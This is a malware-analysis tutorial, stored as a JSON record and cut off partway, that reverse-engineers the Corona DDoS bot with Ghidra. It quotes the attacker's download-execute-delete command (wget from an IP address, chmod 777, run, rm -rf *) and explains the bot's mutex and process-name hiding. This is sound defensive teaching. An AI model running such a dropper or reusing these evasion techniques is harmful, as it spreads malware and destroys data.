{
    "id": "c6c57b6f-0084-417a-ba65-f5d7aa52306d",
    "created_at": "2023-01-12T15:05:16.01615Z",
    "updated_at": "2025-03-27T02:05:37.579467Z",
    "deleted_at": null,
    "sha1_hash": "6fd642a6675280cfebd9304825f18329f91cbe51",
    "title": "2019-10-14 - Corona DDoS bot",
    "authors": "",
    "file_creation_date": "2022-05-28T03:50:27Z",
    "file_modification_date": "2022-05-28T03:50:27Z",
    "file_size": 253351,
    "plain_text": "# Corona DDoS bot\n\n**[maxkersten.nl/binary-analysis-course/malware-analysis/corona-ddos-bot/](https://maxkersten.nl/binary-analysis-course/malware-analysis/corona-ddos-bot/)**\n\n_This article was published on the 14th of October 2019. This article was updated on the 19th_\n_of March 2020, as well as on the 7th of December 2021._\n\nDistributed denial of service (DDoS) attacks can successfully deny the victim’s access to the\ninternet for a period of time. Compromised servers can be used to launch such an attack.\nAdditionally, the rise of infected smart devices that are connected to the internet, allow\ncriminal actors to grow their botnets to sizes that were not seen before. These smart devices\naren’t updated in time, if updates are released at all.\n\nIn this article, the Corona DDoS tool is analysed in the usual step-by-step manner. It contains\nelements of the BASHLITE family. The used analysis method will mainly focus on a breadthfirst top-down approach. Breadth-first means that a function is analysed completely before\nmoving on to functions that are called within the current function. Top-down means that the\nanalysis begins at the start of the program, after which the analysis follows the flow of the\nprogram itself.\n\n## Table of contents\n\n Outline\n\nIn this article, multiple phases will be described using the usual step-by-step approach.\nFirstly, the main function is analysed in order to get an overview of the malware’s lay-out.\nSecondly, the local address is obtained. Thirdly, the mutex that is used by the malware is\ndescribed. Fourthly, the decryption routine for the encrypted strings will be analysed and\nrewritten in Java. Using this decryptor, the actual values of the encrypted strings can be\nobtained. Fifthly, the bot’s registration at the command & control server will be analysed,\nincluding a connectivity check. Sixthly, the process of dispatching incoming commands will\nbe analysed. Lastly, a conclusion is made based upon the findings.\n\n## Sample information\n\nThe sample that is analysed in this article can be found based upon the following\ninformation.\n```\nMD5: c2ab26263fa70e28e6d63b4fe4519a93\nSHA-1: 2f1194a220b677fbeb66ad6fed606e795abc5fd0\nSHA-256: b2aa076b43bb3369b6af3e884896679009dd91222f4c29f28426fdedc46d2bde\nSize: 65620 bytes\n\n```\n\n-----\n\n[Additionally, one can download it from VirusBay,](https://beta.virusbay.io/sample/browse/c2ab26263fa70e28e6d63b4fe4519a93) [Malware Bazaar, or](https://bazaar.abuse.ch/sample/b2aa076b43bb3369b6af3e884896679009dd91222f4c29f28426fdedc46d2bde/) [MalShare.](https://malshare.com/sample.php?action=detail&hash=c2ab26263fa70e28e6d63b4fe4519a93)\n\n## Obtaining the sample\n\nAn anonymous source provided the sample, along with the commands that are executed by\nthe malicious actor. The commands are given below.\n```\nwget http://91[.]209[.]70[.]174/Corona.x86_64; chmod 777 *; ./Corona.x86_64 ROOTS; rm\n-rf *;)\n\n```\n[The malware is downloaded from the given URL using wget, after which](https://www.gnu.org/software/wget/) [chmod is used to](https://linux.die.net/man/1/chmod)\nset the Read Write Execute bits of every file in the current directory to true. This makes the\ndownloaded program executable. The program is then started with a single command line\nargument: ROOTS. All files in the working directory are then forcefully and recursively\n[removed using rm using rm -rf.](https://linux.die.net/man/1/rm)\n\n## Used tooling\n\n[The analysis of this program is done with Ghidra 9.0.2. When loading the ELF binary into](https://ghidra-sre.org/releaseNotes_9.1.html#9_0_2)\nGhidra, all default analysis options are selected as well as the Decompiler Parameter ID\noption. Further renaming and retyping of variables will be done manually.\n\n## Technical analysis\n\nThis version of the Corona bot contains the original symbols, since the binary was not\ncompiled with the strip flag. The analysis in this article will not rely on the symbols, as they\nare not always present, nor are they always accurate.\n\nGhidra’s decompiler will be used to get an overview of the code, but the assembly\ninstructions will be used to verify the output, especially in cases where the generated pseudo\ncode looks unlikely or incorrect.\n\n### Committing local variables\n\nWhen viewing a function in the decompiler, it is helpful to right click somewhere in the\ndecompiler window and select the Commit Locals option. This saves the variables for later\nusage and is used to optimise the code within the function. Additionally, it renames variables\nbased on the argument names of the functions that are called within the code. Whenever a\nfunction is analysed within this article, the local variables are committed.\n\n## Analysing the main function\n\nThe starting point of this binary is found in the main function. In here, the core logic of the\nprogram is located. The complete code of the function is given below, after which it is\nanalysed in parts.\n\n\n-----\n\n```\nvoid main(undefined8 uParm1,long lParm2)\n{\n __pid_t _Var1;\n uint uVar2;\n time_t tVar3;\n undefined2 local_78;\n undefined local_76 [90];\n uint local_1c;\n local_1c = local_addr();\n ensure_bind((ulong)local_1c);\n signal(0x11,(__sighandler_t)0x1);\n signal(1,(__sighandler_t)0x1);\n _Var1 = fork();\n if (_Var1 < 1) {\n  encryption_init();\n  if (*(long *)(lParm2 + 8) == 0) {\n   strcpy(myinfo + 100,enc_unknown);\n  }\n  else {\n   strcpy(myinfo + 100,*(char **)(lParm2 + 8));\n  }\n  local_78 = 0x20;\n  memset(local_76,0,0x4e);\n  prctl(0xf,&local_78);\n  tVar3 = time((time_t *)0x0);\n  uVar2 = getpid();\n  srandom(uVar2 ^ (uint)tVar3);\n  do {\n   connection();\n   recv_buf();\n  } while( true );\n }\n return;\n}\n\n```\nAfter the declaration of the variables, the local_addr function is called, which returns a\nnumeric value. Based on the function name, this function is likely to return the local address\nof the machine. Based on which local_1c can be renamed to localAddr. This value is then\nused as an argument in the ensure_bind function, which is likely to ensure that a binding of\nsorts is present.\n\nThe two signal function calls after that set the way that signals are handled. The signal\nfunction has the following function signature:\n```\nvoid ( *signal(int signum, void (*handler)(int)) ) (int);\n\n```\nThe first argument (named signum) is the specific value of the signal. The second argument\nis used to determine what needs to be done with the signal that is specified in the first\nargument.\n\n\n-----\n\nIn the main function s signal functions, the signum parameter equals 0x11 (or 17 in decimal)\n[and 1. According to the x86_64 Linux signal.h source code, these values are equal to](https://github.com/torvalds/linux/blob/master/arch/ia64/include/uapi/asm/signal.h)\n_SIGCHLD and SIGHUP respectively._\n\nThe SIGCHLD (SIG CHILD) signal is sent to a process when a child process ends. The\nexistence of a child process is logical, since the fork function is called later on in the main\nfunction.\n\nThe SIGHUP (SIG HANGUP) signal is sent to a process when the terminal that controls the\nprocess, is closed.\n\nThe second parameter, equal to 0x01 in both cases, equals SIG_IGN (SIG IGNORE), as can\n[be seen in the Linux man pages. This means that the specified signals are effectively](http://man7.org/linux/man-pages/man7/signal.7.html)\nignored, leaving the process running when it’s controlling terminal is closed or when a child\nprocess ends.\n\nIn Ghidra’s disassembler view, one can right click on a value and select Set Equate.\nAlternatively, one can press E. This allows Ghidra to display a custom string, instead of a\nconstant value. In this case, the enum values can be used to redefine the constant integer\nvalues that are given in the disassembly. This increases the readability of the code a lot. The\nchange is given below.\n```\n//Before\nsignal(0x11,(__sighandler_t)0x1);\nsignal(1,(__sighandler_t)0x1);\n//After\nsignal(SIGCHLD,(__sighandler_t)SIG_IGN);\nsignal(SIGHUP,(__sighandler_t)SIG_IGN);\n\n```\nThe next part of the function creates a child process. The return value of the fork function\nneeds to be less than 1 in order for the execution to continue.\n```\n _Var1 = fork();\n if (_Var1 < 1) {\n  //Continue execution\n }\n return;\n\n```\nThe [Linux manual pages provide information about the possible return values, as can be](http://man7.org/linux/man-pages/man2/fork.2.html)\nseen below.\n```\nOn success, the PID of the child process is returned in the parent,\nand 0 is returned in the child. On failure, -1 is returned in the\nparent, no child process is created, and errno is set appropriately.\n\n```\nBased on this, one can conclude that the code within the if-statement is executed by the\nchild process. If the creation of the child process fails, the parent will execute the body of the\nif-statement\n\n\n-----\n\nTo increase the readability of the code, _Var1 can be renamed into forkResult. One can do\nthis by using the context menu when right clicking on the variable in the decompiler and\nselecting Rename Variable. Alternatively, one can press L when the variable is selected.\n\nThe body of the if-statement contains a call to the encryption_init function, which does not\nreturn a value. After that, yet another if-statement is present, as can be seen below.\n```\nencryption_init();\nif (*(long *)(lParm2 + 8) == 0) {\n strcpy(myinfo + 100,enc_unknown);\n}\nelse {\n strcpy(myinfo + 100,*(char **)(lParm2 + 8));\n}\n\n```\nThe variable that is located at lParm2 + 8 is compared to the value 0. Within the if-statement,\nthe value is treated as (*(long *), whilst the declared type equals long. Within the body of the\nif-statement, the variable is treated as a *(char **).\n\nAt first, the value that is located at the address that lParm2 + 8 points to, is compared to\n_NULL. If this is the case, a string named enc_unknown is copied into myinfo + 100. If the_\ncomparison is not equal, the value that resides at lParm2 + 8 is copied into myinfo + 100.\n\nIn the x86_64 architecture, the size of an integer equals 8 bytes. The second parameter of\nthe main function is a string array which contains the command line arguments. At index 0, a\npointer towards the program itself is present. At index 1, a pointer to the first command line\nargument is given.\n\nIn this case, the first check verifies the presence of a command line argument. If it is present,\nthe value is copied into myinfo + 100. If not, the value of enc_unknown is copied.\n\n### Creating a custom structure\n\nThe global variable myinfo is 300 bytes in size. When using selecting myinfo in the\ndisassembler by double clicking, one can use CTRL + SHIFT + F to find cross references. As\na result, multiple cross references are shown, where only two locations are accessed: myinfo\n_+ 100 and myinfo + 200. To clarify the code even further, one can change the type of myinfo_\nto a custom struct that contains 3 arrays of 100 characters each.\n\nOne can create a custom struct in the Data Type Manager, which is located in the bottom left\ncorner by default. In here, all used data types are found. The binary’s name is also included\nin this list, which is where this custom struct will be added, as the struct only occurs within\nthis binary. Right clicking on the entry with the binary’ s name shows a context menu with\nmultiple options. Select New -> Structure.\n\n\n-----\n\nIn the bottom part of the screen that pops up, one can give the structure a name. In this\ncase, the given name equals myinfo_struct. The green plus at the top is used to add a field\nto the struct. Next up, double click the on the text box in the DataType column. Here, the type\nof the field is to be defined. In this case, a character array will be used. The length of the\narray, in all three cases, is 100 characters: char[100].\n\nAfter defining the fields, they remain nameless. The first field has no references according to\nthe cross references, thus the name is irrelevant. The name that is used in this article is\n_unknown_1. The second field contains the command line argument, which can thus be_\nnamed command_line_argument. Lastly, the third field needs a name. As the content of this\nfield is not yet known, the name unknown_2 is assigned until more information is known.\n\nThe floppy symbol saves the custom struct, after which the structure editor can be closed. To\nuse the newly created structure, one needs to navigate to myinfo in the disassembler, select\nit and press T. Alternatively, one can use the context menu of the right mouse button and\nselect Data -> Select Data Type. Search for myinfo_struct and select the type. The\ndecompiled code should then automatically change, as can be seen below.\n```\n//Before\nif (*(long *)(lParm2 + 8) == 0) {\n strcpy(myinfo + 100,enc_unknown);\n}\nelse {\n strcpy(myinfo + 100,*(char **)(lParm2 + 8));\n}\n//After\nif (*(long *)(lParm2 + 8) == 0) {\n strcpy(myinfo.command_line_argument,enc_unknown);\n}\nelse {\n strcpy(myinfo.command_line_argument,*(char **)(lParm2 + 8));\n}\n\n```\nThis makes the code much more readable and removes the mental note that myinfo + 100\ncontains the command line argument. Note that lParm2 can be renamed to argv. To further\nincrease the readability of the code, one can retype argv into a char**. The decompiler will\nthen correctly display the variable as an array, as can be seen below.\n\n\n-----\n\n```\n//Before\nif (*(long *)(lParm2 + 8) == 0) {\n strcpy(myinfo.command_line_argument,enc_unknown);\n}\nelse {\n strcpy(myinfo.command_line_argument,*(char **)(lParm2 + 8));\n}\n//After\nif (argv[1] == (char *)0x0) {\n strcpy(myinfo.command_line_argument,enc_unknown);\n}\nelse {\n strcpy(myinfo.command_line_argument,argv[1]);\n}\n\n### Continuation of main\n\n```\nThe last part of the main function is given below.\n```\nlocal_78 = 0x20;\nmemset(local_76,0,0x4e);\nprctl(0xf,&local_78);\n\n```\n[The variable local_78 is used as an argument in the prctl (PRocess ConTroL) function. This](http://man7.org/linux/man-pages/man2/prctl.2.html)\nfunction alters a process based on the first argument, which is 0xf (15 in decimal) in this\n[case. The enum’s value can be found in prctl.h of the Linux source code. The value 0xf is](https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h)\nequal to PR_SET_NAME. This option requires only one additional parameter, which is also\npresent in the decompiled code: a string. This string is the new name of the calling thread.\n\nThis effectively changes the parent process’ name to 0x20. The value 0x20 is, according to\nthe [ASCII table, a space. This makes the parent process hard to spot in a process overview.](http://www.asciitable.com/)\nThe variable local_78 can be renamed into parentName. The refactored code is given below.\n```\nparentName = 0x20;\nmemset(local_76,0,0x4e);\nprctl(0xf,&parentName);\n\n```\nThe call to [memset seems irrelevant here, as there are no cross references to local_76](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memset-wmemset?view=vs-2019)\npresent. This might be a compiler optimisation, or it might be left by the malware’s author\nwhilst working on changes.\n```\ntVar3 = time((time_t *)0x0);\nuVar2 = getpid();\nsrandom(uVar2 ^ (uint)tVar3);\ndo {\n connection();\n recv_buf();\n} while( true );\n\n```\n\n-----\n\n[The variable tVar3 is equal to the return value of the time function. This function returns the](https://en.cppreference.com/w/cpp/chrono/c/time)\n[amount of seconds that have passed since Epoch (the start of 1970). The getpid function is](http://man7.org/linux/man-pages/man2/getpid.2.html)\nused to obtain the current process’ ID. The process ID is xored with the current time in\n[seconds since epoch, after which the result is passed to the srandom function. The value](https://linux.die.net/man/3/srandom)\n[serves as a seed for future calls towards rand, which returns a random value based on the](https://www.tutorialspoint.com/c_standard_library/c_function_rand.htm)\nseed.\n\nAs such, the variables tVar3 and uVar2 can be renamed into currentTime and pidNumber\nrespectively. The refactored code is given below.\n```\ncurrentTime = time((time_t *)0x0);\npidNumber = getpid();\nsrandom(pidNumber ^ (uint)currentTime);\n\n```\nAt last, an endless loop is entered. Within this loop, two functions are called, as can be seen\nbelow.\n```\ndo {\n connection();\n recv_buf();\n} while( true );\n\n### A recap of main\n\n```\nBefore going into the functions that are called, a quick recap of the main function is given,\nalong with the refactored code.\n\nThe local_addr function is called, which likely returns the local address, which is then used in\nthe ensure_bind function. Two signals are then to be ignored, after which a fork of the\nprogram is created.\n\nIf the forking is successful, the encryption_init function is called. When an argument is given\non the command line, that value is copied into the myinfo struct. If not, a default value is\ncopied.\n\nThe name of the parent thread is then changed to a space, making it harder to see in a\nvisual overview. The memset call can be ignored, as there are no cross references. The\nrandomisation function is then seeded with the current time in Epoch format and the current\nprocess ID.\n\nAt last, the connection and recv_buf functions are called in an endless loop.\n\nThe complete refactored main function is given below.\n\n\n-----\n\n```\nvoid main(undefined8 param_1,char argv)\n{\n __pid_t forkResult;\n uint pidNumber;\n time_t currentTime;\n undefined2 parentName;\n undefined local_76 [90];\n uint localAddr;\n localAddr = local_addr();\n ensure_bind((ulong)localAddr);\n signal(SIGCHLD,(__sighandler_t)SIG_IGN);\n signal(SIGHUP,(__sighandler_t)SIG_IGN);\n forkResult = fork();\n if (forkResult < 1) {\n  encryption_init();\n  if (argv[1] == (char *)0x0) {\n   strcpy(myinfo.command_line_argument,enc_unknown);\n  }\n  else {\n   strcpy(myinfo.command_line_argument,argv[1]);\n  }\n  parentName = 0x20;\n  memset(local_76,0,0x4e);\n  prctl(0xf,&parentName);\n  currentTime = time((time_t *)0x0);\n  pidNumber = getpid();\n  srandom(pidNumber ^ (uint)currentTime);\n  do {\n   connection();\n   recv_buf();\n  } while( true );\n }\n return;\n}\n\n## Determining the next steps\n\n```\nAt this point, one can set out multiple paths to fully analyse the malware. In this case, all\nunknown functions will be analysed in the order that they are encountered. This approach\nworks the best to fully understand what the malware is doing.\n\nIf the goal is to analyse how a specific part of the malware works, searching for cross\nreferences to relevant functions and system calls will yield faster results.\n\n## Obtaining the local address\n\nThe local address of a device is useful for malware authors as it is a unique identifier of the\ninfected device. It can provide information about the geographical location of the victim.\nAdditionally, it is useful to know what the address of a bot is, if the main purpose of the bot is\nto participate in DDoS attacks.\n\n\n-----\n\nBefore diving into the local_addr function, it is worth to note the myinfo struct s third field is\nused in this method. The code is given below.\n```\nulong local_addr(void)\n{\n int __fd;\n uint local_3c;\n socklen_t local_2c;\n sa_family_t local_28;\n uint16_t local_26;\n uint32_t local_24;\n int local_c;\n local_2c = 0x10;\n __fd = socket(2,2,0);\n if (__fd == -1) {\n  local_3c = 0;\n }\n else {\n  local_28 = 2;\n  local_3c = htonl(0x8080808);\n  htons(0x35);\n  connect(__fd,(sockaddr *)&local_28,0x10);\n  getsockname(__fd,(sockaddr *)&local_28,&local_2c);\n  close(__fd);\n  sprintf(myinfo.unknown_2,\"%d.%d.%d.%d\",(ulong)(byte)local_3c,(ulong)(byte)\n(local_3c >> 8),\n      (ulong)(local_3c >> 0x10 & 0xff),(ulong)(local_3c >> 0x18));\n }\n return (ulong)local_3c;\n}\n\n```\nThe [socket function is used to create a socket. The function signature is given below.](http://man7.org/linux/man-pages/man2/socket.2.html)\n```\nint socket (int __domain, int __type, int __protocol)\n\n```\n[When looking into the x86_64 Linux source code for socket.h, one will see that the domain](https://github.com/torvalds/linux/blob/master/include/linux/socket.h)\nequals AF_INET. The type, as can be seen [here, equals SOCK_DGRAM. The protocol value](https://github.com/torvalds/linux/blob/master/include/linux/net.h)\n0, as defined in /etc/protocols on Linux systems, leaves the protocol type up to the system.\n[Below is an excerpt from the manual page:](https://linux.die.net/man/2/socket)\n```\nThe protocol specifies a particular protocol to be used with the socket. Normally \nonly a single protocol exists to support a particular socket type within a given \nprotocol family, in which case protocol can be specified as 0.\n\n```\nUsing the equate functionality, one can change the values in Ghidra according to their\noriginal names. The change in code is given below.\n```\n//Before\n__fd = socket(2,2,0);\n//After\n__fd = socket(AF_INET,SOCK_DGRAM,DEFAULT_PROTOCOL);\n\n```\n\n-----\n\nThe return value of the socket is -1 when an error occurs. If there is no error, the file\ndescriptor is returned. The variable local_3c is returned at the end of the function. As such, it\ncan be refactored to output. The output is converted from host order into network order using\n[htonl.](https://beej.us/guide/bgnet/html/multi/htonsman.html)\n\nIf there is no error, the local_28 variable is set to 2. Additionally, one can see the call to the\n[htons function, which converts the value from host to network order. The hexadecimal value](https://beej.us/guide/bgnet/html/multi/htonsman.html)\n_0x35 equals 53 in decimal. One can display the decimal value in Ghidra by right clicking the_\nvalue and selecting Convert, where Unsigned Decimal should be chosen.\n\nThe [getsockname function is used to get the address to which the given socket is bound.](https://linux.die.net/man/2/getsockname)\nAlternatively, it can also be used to determine what the IP address of the callee is, as can be\n[read here. This condition is only met if the](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-getsockname#remarks) [connect function is called without a prior call to the](https://linux.die.net/man/3/connect)\n[bind function. It expects several arguments, as can be seen below.](https://linux.die.net/man/2/bind)\n```\nint getsockname(int sockfd, struct sockaddr *addr, socklen_t * addrlen);\n\n```\nIn this case, the first argument is the socket that was created before. The second argument\nseems to point to a structure with the following lay-out:\n```\nstruct sockaddr {\n  unsigned short  sa_family;\n  char       sa_data[14];\n};\n\n```\nThe value 2 (which is equal to AF_INET), is set as a family type. The second field, however,\nis never set, as can be seen below.\n```\nlocal_28 = 2;\noutput = htonl(0x8080808);\nhtons(0x35);\n\n```\nThe output variable is made equal to 8.8.8.8, which is Google’s DNS server address. The\n[htons function receives a single argument, which is equal to 53 in decimal. This is the port](https://linux.die.net/man/3/htons)\nthat is used for DNS requests.\n\nThe reason that the code looks odd here, is because the wrong type is being used. When\n[looking at other socketaddr structs, one will see the sockaddr_in structure, which is also](https://www.tutorialspoint.com/unix_sockets/socket_structures.htm)\ngiven below.\n```\nstruct sockaddr_in {\n  short int      sin_family;\n  unsigned short int  sin_port;\n  struct in_addr    sin_addr;\n  unsigned char    sin_zero[8];\n};\n\n```\n\n-----\n\nThis structure has fields for the family, port, address and some padding. When changing the\ntype of local_28, the decompiler automatically adjusts the code. A comparison is given\nbelow.\n```\n//Before\nlocal_28 = 2;\noutput = htonl(0x8080808);\nhtons(0x35);\n//After\nlocal_28.sin_family = 2;\nlocal_28.sin_addr = htonl(0x8080808);\nlocal_28.sin_port = htons(0x35);\n\n```\nNote that the socket input family (where the value equals two) also equals AF_INET. This\ncan also be changed in the disassembler to reflect this in the code.\n```\n//Before\nlocal_28.sin_family = 2;\n//After\nlocal_28.sin_family = AF_INET;\n\n```\nBased on this information, the local_28 variable can be renamed into socket_input. The\n[getsockname function requires the socket address input structure size as a third parameter.](https://linux.die.net/man/2/getsockname)\nAs such, the local_2c variable can be renamed to socketSize. The changes in the code are\ngiven below.\n```\n//[...]\nsocket_input.sin_family = AF_INET;\nsocket_input.sin_addr = htonl(0x8080808);\nsocket_input.sin_port = htons(0x35);\n//[...]\ngetsockname(__fd,(sockaddr *)&socket_input,&socketSize);\n\n```\nAfter that, a connection is made to the IP address, the socket name is obtained and the\n[socket handle is closed. As described above, a call to connect without a call to the bind](https://linux.die.net/man/3/connect)\nfunction, will result in the local address of the device in the given sockaddr_in structure. The\nlocal address is then copied into the unknown_2 field of the myinfo struct.\n\nTo edit the myinfo struct, one needs to search for the struct’s name in the Data Type\nManager, right click on it, and select Edit. The name of the third field should be changed from\n_unknown_2 to local_address. Press the floppy icon to save the changes. The disassembly_\nand decompiler views are then automatically updated to show the latest changes. Below, the\ndifference in code is given.\n\n\n-----\n\n```\n//Before\nsprintf(myinfo.unknown_2,\"%d.%d.%d.%d\",(ulong)(byte)socket_input.sin_addr,\n      (ulong)(byte)(socket_input.sin_addr >> 8),(ulong)(socket_input.sin_addr\n>> 0x10 & 0xff),\n      (ulong)(socket_input.sin_addr >> 0x18));\n//After\nsprintf(myinfo.local_address,\"%d.%d.%d.%d\",(ulong)(byte)socket_input.sin_addr,\n      (ulong)(byte)(socket_input.sin_addr >> 8),(ulong)(socket_input.sin_addr\n>> 0x10 & 0xff),\n      (ulong)(socket_input.sin_addr >> 0x18));\n\n### local_addr summary\n\n```\nTo summarise, the socket is created. Upon failure to do so, this function will return -1. If the\nsocket creation succeeds, a DNS request is made to Google’s DNS server 8.8.8.8 at port 53.\nThe return value will contain the local address, which is then stored in the myinfo struct.\nAdditionally, the function will return the local IP address.\n\nThe complete refactored function is given below.\n```\nulong local_addr(void)\n{\n int __fd;\n uint32_t output;\n socklen_t socketLength;\n sockaddr_in socket_input;\n int local_c;\n socketLength = 0x10;\n __fd = socket(AF_INET,SOCK_DGRAM,DEFAULT_PROTOCOL);\n if (__fd == -1) {\n  output = 0;\n }\n else {\n  socket_input.sin_family = AF_INET;\n  socket_input.sin_addr = htonl(0x8080808);\n  socket_input.sin_port = htons(0x35);\n  connect(__fd,(sockaddr *)&socket_input,0x10);\n  getsockname(__fd,(sockaddr *)&socket_input,&socketLength);\n  close(__fd);\n  sprintf(myinfo.local_address,\"%d.%d.%d.%d\",(ulong)(byte)socket_input.sin_addr,\n      (ulong)(byte)(socket_input.sin_addr >> 8),(ulong)(socket_input.sin_addr\n>> 0x10 & 0xff),\n      (ulong)(socket_input.sin_addr >> 0x18));\n  output = socket_input.sin_addr;\n }\n return (ulong)output;\n}\n\n## The socket mutex\n\n```\n\n-----\n\nA [mutex is used rather often in malware. It is generally used to check if the system is already](https://en.cppreference.com/w/cpp/thread/mutex)\ninfected. To avoid interfering with itself, the newest instance of the malware will then shut\nitself off. A mutex can be the system’s mutex, but it can also be a file or a registry key. In this\ncase, a different type of mutex is used.\n\n### Analysing ensure_bind\n\nThe first step is to commit the local variables, in order for Ghidra to optimise the decompiled\ncode.\n\nWhen taking a quick glance at the decompiled output, a similar case compared to the\nprevious function can be seen. The variable local_28 is of the sa_family_t type, but is used\nas the sockaddr in the [bind function.](https://linux.die.net/man/2/bind)\n\nChanging the type from sa_family_t to socketaddr_in provides the correct decompiled\npseudo code. Also note the fact that ensure_bind does not take any arguments, whilst the\ncode in the main function does provide an argument: the return value of the local_addr\nfunction. When the correct type is applied, the function argument becomes visible and\nusable. The difference is given below.\n```\n//Before\n if (__fd != -1) {\n  local_28 = 2;\n  htons(0x22b8);\n  uVar1 = fcntl(__fd,3,0);\n//After\n if (__fd != -1) {\n  local_28.sin_family = 2;\n  local_28.sin_port = htons(0x22b8);\n  local_28.sin_addr = iParm1;\n  uVar1 = fcntl(__fd,3,0);\n\n```\nThe variable local_28 can be renamed into socketAddr. The complete code of the\n_ensure_bind function is given below._\n\n\n-----\n\n```\nvoid ensure_bind(in_addr_t iParm1)\n{\n int __fd;\n uint uVar1;\n int iVar1;\n uint32_t uVar2;\n int *piVar3;\n int *piVar2;\n sockaddr_in socketAddr;\n int local_10;\n int local_c;\n __fd = 0xffffffff;\n __fd = socket(2,1,0);\n if (__fd != -1) {\n  socketAddr.sin_family = 2;\n  socketAddr.sin_port = htons(0x22b8);\n  socketAddr.sin_addr = iParm1;\n  uVar1 = fcntl(__fd,3,0);\n  fcntl(__fd,4,(ulong)(uVar1 & 0xffff0000 | (uint)CONCAT11((char)((ulong)uVar1 >>\n8),(char)uVar1))\n         | 0x800);\n  piVar3 = __GI___errno_location();\n  *piVar3 = 0;\n  iVar1 = bind(__fd,(sockaddr *)&socketAddr,0x10);\n  piVar2 = __GI___errno_location();\n  if ((iVar1 == -1) && (*piVar2 == 99)) {\n   close(__fd);\n   sleep(1);\n   uVar2 = htonl(0x7f000001);\n   ensure_bind((ulong)uVar2);\n  }\n  else {\n   if (iVar1 == -1) {\n    exit(1);\n   }\n   listen(__fd,1);\n  }\n }\n return;\n}\n\n```\nAt first, an AF_INET socket is created, of the SOCK_STREAM type, together with the default\nprotocol. The change is given below.\n```\n//Before\n__fd = socket(2,1,0);\n/After\n__fd = socket(AF_INET,SOCK_STREAM,DEFAULT_PROTOCOL);\n\n```\nIf the creation of the socket does not fail, a sockaddr_in struct is created. The family equals\n_AF_INET, which is represented by the value 2. The port is equal to 0x22b8 (or 8888 in_\ndecimal). The address is taken from the function’s argument, which is named iParm1. Since\n\n\n-----\n\nthe value of iParm1 is equal to the return value of local_addr, this value is equal to the IP\naddress of the machine. This variable can be renamed to inputAddress.\n\n[The next part of the body of the if-statement calls fcntl (which stands for File CoNTroL) twice.](https://linux.die.net/man/3/fcntl)\nThis function requires a file descriptor as input, together with a command and a value.\n```\nuVar1 = fcntl(__fd,3,0);\nfcntl(__fd,4,(ulong)(uVar1 & 0xffff0000 | (uint)CONCAT11((char)((ulong)uVar1 >> 8),\n(char)uVar1)) | 0x800);\n\n```\nPer [Linux’ source code, the commands 3 and 4 are equal to F_GETFL and F_SETFL](https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/fcntl.h)\nrespectively. These commands, in order, get and set the file, based on the given file\ndescriptor. These can be changed within Ghidra as such. The refactored code is given\nbelow.\n```\nuVar1 = fcntl(__fd,F_GETFL,0);\nfcntl(__fd,F_SETFL,(ulong)(uVar1 & 0xffff0000 | (uint)CONCAT11((char)((ulong)uVar1 >>\n8),(char)uVar1)) | 0x800);\n\n```\nThe next part of the code is given below.\n```\npiVar3 = __GI___errno_location();\n*piVar3 = 0;\niVar1 = bind(__fd,(sockaddr *)&socketAddr,0x10);\npiVar2 = __GI___errno_location();\nif ((iVar1 == -1) && (*piVar2 == 99)) {\n\n```\nThe outcome of the first __GI___errno_location call is set to 0 directly afterwards. As such,\nthe piVar3 variable can be ignored within this function.\n\nAfter that, the [bind function is called to bind the newly created sockaddr_in onto the given](https://linux.die.net/man/2/bind)\nsocket. The return value is stored in iVar1. The iVar1 variable can be renamed to bindResult.\nAdditionally, the last error code is obtained and stored in piVar2. The piVar2 can be renamed\nto lastErrorCode. The refactored code is given below.\n```\npiVar3 = __GI___errno_location();\n*piVar3 = 0;\nbindResult = bind(__fd,(sockaddr *)&socketAddr,0x10);\nlastErrorCode = __GI___errno_location();\nif ((bindResult == -1) && (*lastErrorCode == 99)) {\n\n```\nThe if-statement above checks if the bindResult is equal to -1 and if the last error code is\n[equal to 99. The enum value that corresponds with 99 is present in the Linux source code:](https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/errno.h)\n_EADDRNOTAVAIL. Using the Equate functionality within Ghidra, one can replace 99 with_\n_EADDRNOTAVAIL. This value is returned when the address is not available, which would_\nhappen when it is already in use. The code is given below.\n\n\n-----\n\n```\nif ((bindResult  1) && ( lastErrorCode  EADDRNOTAVAIL)) {\n close(__fd);\n sleep(1);\n uVar2 = htonl(0x7f000001); //127.0.0.1\n ensure_bind((ulong)uVar2);\n}\n\n```\nIf this is the case, the socket is closed, a one second sleep is induced, and the address\n_127.0.0.1 is stored in uVar2. The uVar2 variable can be renamed into localhost. The iVar1_\nvariable can be renamed into bindResult. The ensure_bind function is then called again, this\ntime with 127.0.0.1 as its parameter. Effectively, port 8888 on the machine is used, be it via\nthe previously obtained local address or via the local host.\n\nThe next part of the code is given below.\n```\nif (bindResult == -1) { //\n exit(1);\n}\nlisten(__fd,1);\n\n```\nIf the socket cannot be created but the error code does not equal 99, the program exits. If the\nsocket can be created, the [listen function is called. The first argument is the file descriptor.](http://man7.org/linux/man-pages/man2/listen.2.html)\nThe second argument is the size of the backlog, which is the amount of incoming\nconnections that are put on hold for the given socket. If the given number is exceeded,\n_ECONNREFUSED (or 111 in decimal) is returned._\n\nThis binding serves as some sort of mutex: if the bot is already active, the binding is\ncomplete and a new instance will then shut itself down. If it is the first instance, it creates the\nrequired bindings and continues with the execution.\n\nThe complete refactored code of the function is given below.\n\n\n-----\n\n```\nvoid ensure_bind(in_addr_t inputAddress)\n{\n int __fd;\n uint uVar1;\n int bindResult;\n uint32_t localhost;\n int *piVar3;\n int *lastErrorCode;\n sockaddr_in socketAddr;\n int local_10;\n int local_c;\n __fd = 0xffffffff;\n __fd = socket(AF_INET,SOCK_STREAM,DEFAULT_PROTOCOL);\n if (__fd != -1) {\n  socketAddr.sin_family = 2;\n  socketAddr.sin_port = htons(0x22b8);\n  socketAddr.sin_addr = inputAddress;\n  uVar1 = fcntl(__fd,F_GETFL,0);\n  fcntl(__fd,F_SETFL,\n     (ulong)(uVar1 & 0xffff0000 | (uint)CONCAT11((char)((ulong)uVar1 >> 8),\n(char)uVar1)) |\n     0x800);\n  piVar3 = __GI___errno_location();\n  *piVar3 = 0;\n  bindResult = bind(__fd,(sockaddr *)&socketAddr,0x10);\n  lastErrorCode = __GI___errno_location();\n  if ((bindResult == -1) && (*lastErrorCode == EADDRNOTAVAIL)) {\n   close(__fd);\n   sleep(1);\n   localhost = 